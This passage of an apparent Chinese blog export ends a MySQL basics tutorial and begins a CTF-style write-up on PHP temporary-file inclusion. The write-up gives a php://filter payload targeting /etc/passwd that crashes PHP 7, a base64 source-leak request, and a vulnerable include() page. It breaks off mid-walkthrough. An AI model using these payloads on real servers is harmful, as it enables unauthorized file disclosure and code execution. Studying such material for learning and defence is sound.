<h3 id="删除-1"><a href="#删除-1" class="headerlink" title="删除"></a>删除</h3><h4 id="删除表中的列"><a href="#删除表中的列" class="headerlink" title="删除表中的列"></a>删除表中的列</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE 表名 DROP 列名;</span><br></pre></td></tr></table></figure>

<p>删除 address 列</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE product2 DROP address;</span><br></pre></td></tr></table></figure>

<h4 id="删除表"><a href="#删除表" class="headerlink" title="删除表"></a>删除表</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP TABLE 表名;</span><br></pre></td></tr></table></figure>

<p>删除 product2 表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP TABLE product2;</span><br></pre></td></tr></table></figure>

<h4 id="删除表，判断、如果存在则删除"><a href="#删除表，判断、如果存在则删除" class="headerlink" title="删除表，判断、如果存在则删除"></a>删除表，判断、如果存在则删除</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP TABLE IF EXISTS 表名;</span><br></pre></td></tr></table></figure>

<h2 id="列"><a href="#列" class="headerlink" title="列"></a>列</h2><h3 id="添加-1"><a href="#添加-1" class="headerlink" title="添加"></a>添加</h3><h4 id="给指定列添加数据"><a href="#给指定列添加数据" class="headerlink" title="给指定列添加数据"></a>给指定列添加数据</h4><p>标准语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO 表名(列名1,列名2,...) VALUES (值1,值2,...);</span><br></pre></td></tr></table></figure>

<p>向 product 表添加一条数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO product(id,NAME,price,stock,insert_time) VALUES (1,&#x27;手机&#x27;,1999.99,25,&#x27;2020-02-02&#x27;);</span><br></pre></td></tr></table></figure>

<p>向 product 表添加指定列数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO product(id,NAME,price) VALUES (2,&#x27;电脑&#x27;,3999.99);</span><br></pre></td></tr></table></figure>

<p>注：要保证插入的数据和已插入的没有重复，不然会报错</p>
<h4 id="给全部列添加数据"><a href="#给全部列添加数据" class="headerlink" title="给全部列添加数据"></a>给全部列添加数据</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO 表名 VALUES (值1,值2,值3,...);</span><br></pre></td></tr></table></figure>

<p>默认给全部列添加数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO product VALUES (3,&#x27;冰箱&#x27;,1500,35,&#x27;2030-03-03&#x27;);</span><br></pre></td></tr></table></figure>

<h4 id="批量添加所有列数据"><a href="#批量添加所有列数据" class="headerlink" title="批量添加所有列数据"></a>批量添加所有列数据</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO 表名 VALUES (值1,值2,值3,...),(值1,值2,值3,...),(值1,值2,值3,...);</span><br></pre></td></tr></table></figure>

<p>批量添加数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO product VALUES (4,&#x27;洗衣机&#x27;,800,15,&#x27;2030-05-05&#x27;),(5,&#x27;微波炉&#x27;,300,45,&#x27;2030-06-06&#x27;);</span><br></pre></td></tr></table></figure>

<h3 id="修改-2"><a href="#修改-2" class="headerlink" title="修改"></a>修改</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE 表名 SET 列名1 = 值1,列名2 = 值2,... [where 条件];</span><br></pre></td></tr></table></figure>

<p>修改手机的价格为 3500</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE product SET price=3500 WHERE NAME=&#x27;手机&#x27;;</span><br></pre></td></tr></table></figure>

<p>修改电脑的价格为 1800，库存为 36</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE product SET price=1800,stock=36 WHERE NAME=&#x27;电脑&#x27;;</span><br></pre></td></tr></table></figure>

<h3 id="删除-2"><a href="#删除-2" class="headerlink" title="删除"></a>删除</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DELETE FROM 表名 [WHERE 条件];</span><br></pre></td></tr></table></figure>

<p>删除 product 表中的微波炉那一行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DELETE FROM product WHERE NAME=&#x27;微波炉&#x27;;</span><br></pre></td></tr></table></figure>

<p>删除 product 表中库存为 10 的商品信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DELETE FROM product WHERE stock=10;</span><br></pre></td></tr></table></figure>

<h3 id="查询数据准备"><a href="#查询数据准备" class="headerlink" title="查询数据准备"></a>查询数据准备</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 创建db1数据库</span><br><span class="line">CREATE DATABASE db1;</span><br><span class="line"></span><br><span class="line">-- 使用db1数据库</span><br><span class="line">USE db1;</span><br><span class="line"></span><br><span class="line">-- 创建数据表</span><br><span class="line">CREATE TABLE product(</span><br><span class="line">id INT, -- 商品编号</span><br><span class="line">NAME VARCHAR(20), -- 商品名称</span><br><span class="line">price DOUBLE, -- 商品价格</span><br><span class="line">brand VARCHAR(10), -- 商品品牌</span><br><span class="line">stock INT, -- 商品库存</span><br><span class="line">insert_time DATE -- 添加时间</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">-- 添加数据</span><br><span class="line">INSERT INTO product VALUES</span><br><span class="line">(1,&#x27;华为手机&#x27;,3999,&#x27;华为&#x27;,23,&#x27;2088-03-10&#x27;),</span><br><span class="line">(2,&#x27;小米手机&#x27;,2999,&#x27;小米&#x27;,30,&#x27;2088-05-15&#x27;),</span><br><span class="line">(3,&#x27;苹果手机&#x27;,5999,&#x27;苹果&#x27;,18,&#x27;2088-08-20&#x27;),</span><br><span class="line">(4,&#x27;华为电脑&#x27;,6999,&#x27;华为&#x27;,14,&#x27;2088-06-16&#x27;),</span><br><span class="line">(5,&#x27;小米电脑&#x27;,4999,&#x27;小米&#x27;,26,&#x27;2088-07-08&#x27;),</span><br><span class="line">(6,&#x27;苹果电脑&#x27;,8999,&#x27;苹果&#x27;,15,&#x27;2088-10-25&#x27;),</span><br><span class="line">(7,&#x27;联想电脑&#x27;,7999,&#x27;联想&#x27;,NULL,&#x27;2088-11-11&#x27;);</span><br></pre></td></tr></table></figure>

<h3 id="查询-查询全部"><a href="#查询-查询全部" class="headerlink" title="查询_查询全部"></a>查询_查询全部</h3><h4 id="查询全部数据"><a href="#查询全部数据" class="headerlink" title="查询全部数据"></a>查询全部数据</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM 表名;</span><br></pre></td></tr></table></figure>

<p>注：星号( * )为通配符，表示所有</p>
<p>查询 product 表所有数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM product;</span><br></pre></td></tr></table></figure>

<h4 id="查询指定列"><a href="#查询指定列" class="headerlink" title="查询指定列"></a>查询指定列</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 列名1,列名2,... FROM 表名;</span><br></pre></td></tr></table></figure>

<p>查询名称、价格、品牌</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT NAME,price,brand FROM product;</span><br></pre></td></tr></table></figure>

<h4 id="去除重复查询"><a href="#去除重复查询" class="headerlink" title="去除重复查询"></a>去除重复查询</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT DISTINCT 列名1,列名2,... FROM 表名;</span><br></pre></td></tr></table></figure>

<p>查询品牌</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT brand FROM product;</span><br></pre></td></tr></table></figure>

<p>查询品牌，去除重复</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT DISTINCT brand FROM product;</span><br></pre></td></tr></table></figure>

<h3 id="计算列的值"><a href="#计算列的值" class="headerlink" title="计算列的值"></a>计算列的值</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 列名1 运算符(+ - * /) 列名2 FROM 表名;</span><br></pre></td></tr></table></figure>

<p>如果某一列为 null，可以进行替换</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IFNULL(表达式1,表达式2)</span><br><span class="line"></span><br><span class="line">表达式1：想替换的列</span><br><span class="line"></span><br><span class="line">表达式2：想替换的值</span><br></pre></td></tr></table></figure>

<p>查询商品名称和库存，库存数量在原有基础上加 10</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT NAME,stock+10 FROM product;</span><br></pre></td></tr></table></figure>

<p>查询商品名称和库存，库存数量在原有基础上加 10。进行 null 值判断</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT NAME,IFNULL(stock,0)+10 FROM product;</span><br></pre></td></tr></table></figure>

<h3 id="起别名"><a href="#起别名" class="headerlink" title="起别名"></a>起别名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 列名1,列名2,... AS 别名 FROM 表名;</span><br></pre></td></tr></table></figure>

<p>查询商品名称和库存，库存数量在原有基础上加 10。进行 null 值判断。起别名为 getSum。</p>
<p>输出名称将从 IFNULL(stock,0)+10 变为 getSum</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT NAME,IFNULL(stock,0)+10 AS getSum FROM product;</span><br><span class="line">SELECT NAME,IFNULL(stock,0)+10 getSum FROM product;</span><br></pre></td></tr></table></figure>

<h3 id="查询-2"><a href="#查询-2" class="headerlink" title="查询"></a>查询</h3><h4 id="查询-条件查询"><a href="#查询-条件查询" class="headerlink" title="查询_条件查询"></a>查询_条件查询</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 列名列表 FROM 表名 WHERE 条件;</span><br></pre></td></tr></table></figure>

<p>查询库存大于 20 的商品信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM product WHERE stock &gt; 20;</span><br></pre></td></tr></table></figure>

<p>查询品牌为华为的商品信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM product WHERE brand=&#x27;华为&#x27;;</span><br></pre></td></tr></table></figure>

<p>查询金额在 4000 ~ 6000 之间的商品信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM product WHERE price &gt;= 4000 AND price &lt;= 6000;</span><br><span class="line">SELECT * FROM product WHERE price BETWEEN 4000 AND 6000;</span><br></pre></td></tr></table></figure>

<p>查询库存为 14、30、23 的商品信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM product WHERE stock=14 OR stock=30 OR stock=23;</span><br><span class="line">SELECT * FROM product WHERE stock IN(14,30,23);</span><br></pre></td></tr></table></figure>

<p>查询库存为 null 的商品信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM product WHERE stock IS NULL;</span><br></pre></td></tr></table></figure>

<p>查询库存不为 null 的商品信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM product WHERE stock IS NOT NULL;</span><br></pre></td></tr></table></figure>

<p>查询名称以小米为开头的商品信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM product WHERE NAME LIKE &#x27;小米%&#x27;;</span><br></pre></td></tr></table></figure>

<p>查询名称第二个字是为的商品信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM product WHERE NAME LIKE &#x27;_为%&#x27;;</span><br></pre></td></tr></table></figure>

<p>查询名称为四个字符的商品信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM product WHERE NAME LIKE &#x27;____&#x27;;</span><br></pre></td></tr></table></figure>

<p>查询名称中包含电脑的商品信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM product WHERE NAME LIKE &#x27;%电脑%&#x27;;</span><br></pre></td></tr></table></figure>

<h4 id="查询-聚合函数"><a href="#查询-聚合函数" class="headerlink" title="查询_聚合函数"></a>查询_聚合函数</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 函数名(列名) FROM 表名 [WHERE 条件];</span><br></pre></td></tr></table></figure>

<p>计算 product 表中总记录条数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT COUNT(*) FROM product;</span><br></pre></td></tr></table></figure>

<p>获取最高价格</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT MAX(price) FROM product;</span><br></pre></td></tr></table></figure>

<p>获取最低库存</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT MIN(stock) FROM product;</span><br></pre></td></tr></table></figure>

<p>获取总库存数量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT SUM(stock) FROM product;</span><br></pre></td></tr></table></figure>

<p>获取品牌为苹果的总库存数量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT SUM(stock) FROM product WHERE brand=&#x27;苹果&#x27;;</span><br></pre></td></tr></table></figure>

<p>获取品牌为小米的平均商品价格</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT AVG(price) FROM product WHERE brand=&#x27;小米&#x27;;</span><br></pre></td></tr></table></figure>

<h4 id="查询-排序查询"><a href="#查询-排序查询" class="headerlink" title="查询_排序查询"></a>查询_排序查询</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 列名 FROM 表名 </span><br><span class="line">[WHERE 条件]</span><br><span class="line">ORDER BY 列名1 排序方式1,列名2 排序方式2;</span><br></pre></td></tr></table></figure>

<p>按照库存升序排序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM product ORDER BY stock ASC;</span><br></pre></td></tr></table></figure>

<p>查询名称中包含手机的商品信息。按照金额降序排序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM product WHERE NAME LIKE &#x27;%手机%&#x27; ORDER BY price DESC;</span><br></pre></td></tr></table></figure>

<p>按照金额升序排序，如果金额相同，按照库存降序排列</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM product ORDER BY price ASC,stock DESC;</span><br></pre></td></tr></table></figure>

<h4 id="查询-分组查询"><a href="#查询-分组查询" class="headerlink" title="查询_分组查询"></a>查询_分组查询</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 列名 FROM 表名</span><br><span class="line">[WHERE 条件]</span><br><span class="line">GROUP BY 分组列名</span><br><span class="line">[HAVING 分组后条件过滤] </span><br><span class="line">[ORDER BY 排序列名 排序方式];</span><br></pre></td></tr></table></figure>

<p>按照品牌分组，获取每组商品的总金额</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT brand,SUM(price) FROM product GROUP BY brand;</span><br></pre></td></tr></table></figure>

<p>对金额大于 4000 元的商品，按照品牌分组，获取每组商品的总金额</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT brand,SUM(price) FROM product WHERE price &gt; 4000 GROUP BY brand;</span><br></pre></td></tr></table></figure>

<p>对金额大于 4000 元的商品，按照品牌分组，获取每组商品的总金额，只显示总金额大于 7000 元的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT brand,SUM(price) getSum FROM product WHERE price &gt; 4000 GROUP BY brand HAVING getSum &gt; 7000;</span><br></pre></td></tr></table></figure>

<p>对金额大于 4000 元的商品，按照品牌分组，获取每组商品的总金额，只显示总金额大于 7000 元的、并按照总金额的降序排列</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT brand,SUM(price) getSum FROM product</span><br><span class="line">WHERE price &gt; 4000</span><br><span class="line">GROUP BY brand</span><br><span class="line">HAVING getSum &gt; 7000</span><br><span class="line">ORDER BY getSum DESC;</span><br></pre></td></tr></table></figure>

<h4 id="查询-分页查询"><a href="#查询-分页查询" class="headerlink" title="查询_分页查询"></a>查询_分页查询</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 列名 FROM 表名 </span><br><span class="line">[WHERE 条件] </span><br><span class="line">[GROUP BY 分组列名] </span><br><span class="line">[HAVING 分组后条件过滤] </span><br><span class="line">[ORDER BY 排序列名 排序方式] </span><br><span class="line">LIMIT 当前页数,每页显示的条数;</span><br></pre></td></tr></table></figure>

<p>公式：当前页数 &#x3D; (当前页数-1) * 每页显示的条数</p>
<p>假设每页显示 3 条数据</p>
<ul>
<li><p>第1页：当前页数 &#x3D; (1-1) * 3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM product LIMIT 0,3;</span><br></pre></td></tr></table></figure>
</li>
<li><p>第2页：当前页数 &#x3D; (2-1) * 3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM product LIMIT 3,3;</span><br></pre></td></tr></table></figure>
</li>
<li><p>第3页 当前页数&#x3D;(3-1) * 3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM product LIMIT 6,3;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="表关系"><a href="#表关系" class="headerlink" title="表关系"></a>表关系</h2><h3 id="一对一"><a href="#一对一" class="headerlink" title="一对一"></a>一对一</h3><p>创建 db3 数据库并使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE DATABASE db3;</span><br><span class="line">USE db3;</span><br></pre></td></tr></table></figure>

<p>创建 person 表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE person(</span><br><span class="line">id INT PRIMARY KEY AUTO_INCREMENT, -- 主键id</span><br><span class="line">NAME VARCHAR(20) -- 姓名</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>添加数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO person VALUES (NULL,&#x27;张三&#x27;),(NULL,&#x27;李四&#x27;);</span><br></pre></td></tr></table></figure>

<p>创建 card 表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE card(</span><br><span class="line">id INT PRIMARY KEY AUTO_INCREMENT, -- 主键id</span><br><span class="line">number VARCHAR(20) UNIQUE NOT NULL, -- 身份证号</span><br><span class="line">pid INT UNIQUE, -- 外键列</span><br><span class="line">CONSTRAINT cp_fk1 FOREIGN KEY (pid) REFERENCES person(id)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>添加数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO card VALUES (NULL,&#x27;12345&#x27;,1),(NULL,&#x27;56789&#x27;,2);</span><br></pre></td></tr></table></figure>

<h3 id="一对多"><a href="#一对多" class="headerlink" title="一对多"></a>一对多</h3><p>创建 user 表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE USER(</span><br><span class="line">id INT PRIMARY KEY AUTO_INCREMENT, -- 主键id</span><br><span class="line">NAME VARCHAR(20) -- 姓名</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>添加数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO USER VALUES (NULL,&#x27;张三&#x27;),(NULL,&#x27;李四&#x27;);</span><br></pre></td></tr></table></figure>

<p>创建 orderlist 表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE orderlist(</span><br><span class="line">id INT PRIMARY KEY AUTO_INCREMENT, -- 主键id</span><br><span class="line">number VARCHAR(20), -- 订单编号</span><br><span class="line">uid INT, -- 外键列</span><br><span class="line">CONSTRAINT ou_fk1 FOREIGN KEY (uid) REFERENCES USER(id)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>添加数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO orderlist VALUES (NULL,&#x27;hm001&#x27;,1),(NULL,&#x27;hm002&#x27;,1),(NULL,&#x27;hm003&#x27;,2),(NULL,&#x27;hm004&#x27;,2);</span><br></pre></td></tr></table></figure>

<p>创建 category 表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE category(</span><br><span class="line">id INT PRIMARY KEY AUTO_INCREMENT, -- 主键id</span><br><span class="line">NAME VARCHAR(10) -- 分类名称</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>添加数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO category VALUES (NULL,&#x27;手机数码&#x27;),(NULL,&#x27;电脑办公&#x27;);</span><br></pre></td></tr></table></figure>

<p>创建 product 表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE product(</span><br><span class="line">id INT PRIMARY KEY AUTO_INCREMENT, -- 主键id</span><br><span class="line">NAME VARCHAR(30), -- 商品名称</span><br><span class="line">cid INT, -- 外键列</span><br><span class="line">CONSTRAINT pc_fk1 FOREIGN KEY (cid) REFERENCES category(id)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>添加数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO product VALUES (NULL,&#x27;华为P30&#x27;,1),(NULL,&#x27;小米note3&#x27;,1),(NULL,&#x27;联想电脑&#x27;,2),(NULL,&#x27;苹果电脑&#x27;,2);</span><br></pre></td></tr></table></figure>

<h3 id="多对多"><a href="#多对多" class="headerlink" title="多对多"></a>多对多</h3><p>创建 student 表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE student(</span><br><span class="line">id INT PRIMARY KEY AUTO_INCREMENT, -- 主键id</span><br><span class="line">NAME VARCHAR(20) -- 学生姓名</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>添加数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO student VALUES (NULL,&#x27;张三&#x27;),(NULL,&#x27;李四&#x27;);</span><br></pre></td></tr></table></figure>

<p>创建 course 表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE course(</span><br><span class="line">id INT PRIMARY KEY AUTO_INCREMENT, -- 主键id</span><br><span class="line">NAME VARCHAR(10) -- 课程名称</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>添加数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO course VALUES (NULL,&#x27;语文&#x27;),(NULL,&#x27;数学&#x27;);</span><br></pre></td></tr></table></figure>

<p>创建中间表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE stu_course(</span><br><span class="line">id INT PRIMARY KEY AUTO_INCREMENT, -- 主键id</span><br><span class="line">sid INT, -- 用于和 student 表中的 id 进行外键关联</span><br><span class="line">cid INT, -- 用于和 course 表中的 id 进行外键关联</span><br><span class="line">CONSTRAINT sc_fk1 FOREIGN KEY (sid) REFERENCES student(id), -- 添加外键约束</span><br><span class="line">CONSTRAINT sc_fk2 FOREIGN KEY (cid) REFERENCES course(id) -- 添加外键约束</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>添加数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO stu_course VALUES (NULL,1,1),(NULL,1,2),(NULL,2,1),(NULL,2,2);</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>包含临时文件学习记录</title>
    <url>/2024/03/09/%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<h1 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h1><h2 id="php文件上传特性"><a href="#php文件上传特性" class="headerlink" title="php文件上传特性"></a>php文件上传特性</h2><p><img src="https://s2.loli.net/2023/11/18/5AgRPFiqI4KeX3a.png" alt="img"></p>
<span id="more"></span>

<p>php中上传文件，会创建临时文件，随机生成临时文件名（临时文件名为<code>php+6位[a-zA-Z0-9]</code>，比如<code>phpkx32ma</code>），将上传的内容写入临时文件后，关闭临时文件。在<code>linux</code>下保存在<code>/tmp</code>目录，而在<code>windows</code>下保存在<code>c:\winsdows\temp</code>目录。然后开始执行文件内程序，执行完后删除。因此，可以上传包含payload的恶意文件，在文件被删除前（作为临时文件）包含该文件，可以实现利用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">    <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>配合<code>phpinfo</code>页面的<code>php variables</code>，可以直接获取到上传文件的存储路径和临时文件名</p>
<p><img src="https://s2.loli.net/2023/11/18/YWsGoH6aLJiC2Uc.png" alt="image-20231025142053342"></p>
<h2 id="包含方式"><a href="#包含方式" class="headerlink" title="包含方式"></a>包含方式</h2><p>临时文件转瞬即逝，如何在短时间内包含它？</p>
<h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p>条件竞争就是一直上传文件，同时一直去包含临时文件，竞争一下是先包含还是先删除。</p>
<h3 id="段错误"><a href="#段错误" class="headerlink" title="段错误"></a>段错误</h3><p>所谓的段错误（segment fault）就是指访问的内存超过了系统所给这个程序的内存空间。从而发生程序退出，临时文件就不会被删除。</p>
<p>在php7中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file=php:<span class="comment">//filter/string.strip_tags=/etc/passwd</span></span><br></pre></td></tr></table></figure>

<p>会造成段错误。 </p>
<p>适用版本： </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复</span><br><span class="line">php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复</span><br><span class="line">php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复</span><br></pre></td></tr></table></figure>

<h4 id="实列及详解"><a href="#实列及详解" class="headerlink" title="实列及详解"></a>实列及详解</h4><p>查看网页源代码，发现提示信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username/password error&lt;html&gt;</span><br><span class="line">&lt;!--md5($secret.$name)===$pass --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>传递name参数，用burp抓包并发送到repeater模块</p>
<p><img src="https://s2.loli.net/2023/11/18/y9SgG3NDnjQacIB.png" alt="image-20231025161936687"></p>
<p><img src="https://s2.loli.net/2023/11/18/oQL6JwPxvsfSk4a.png" alt="image-20231025161900649"></p>
<p>经过测试，发现改变name的值，响应包中Hash值会响应改变（name和hash一一对应），结合提示，可以传入pass参数，值为响应包中的Hash值（name值和pass值要相对应）。</p>
<p><img src="https://s2.loli.net/2023/11/18/IDOkeyP7MNYGdKZ.png" alt="image-20231025162123175"></p>
<p>在响应包中发现提示文件：<code>flflflflag.php</code>，访问该文件</p>
<p><img src="https://s2.loli.net/2023/11/18/mxInGt6O72psNyY.png" alt="image-20231025162404641"></p>
<p>发现文件包含，猜测可能是文件包含漏洞，可以查看源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/flflflflag.php?file=php://filter/read=convert.base64-encode/resource=flflflflag.php</span><br></pre></td></tr></table></figure>

<p>用BurpSuite拦截响应，base64解码后得到源码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;</span><br><span class="line">           window.location.href=&quot;404.html&quot;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(preg_match(&#x27;/data|input|zip/is&#x27;,$file))&#123;</span><br><span class="line">	die(&#x27;nonono&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">@include($file);</span><br><span class="line">echo &#x27;include($_GET[&quot;file&quot;])&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>利用目录扫描：</p>
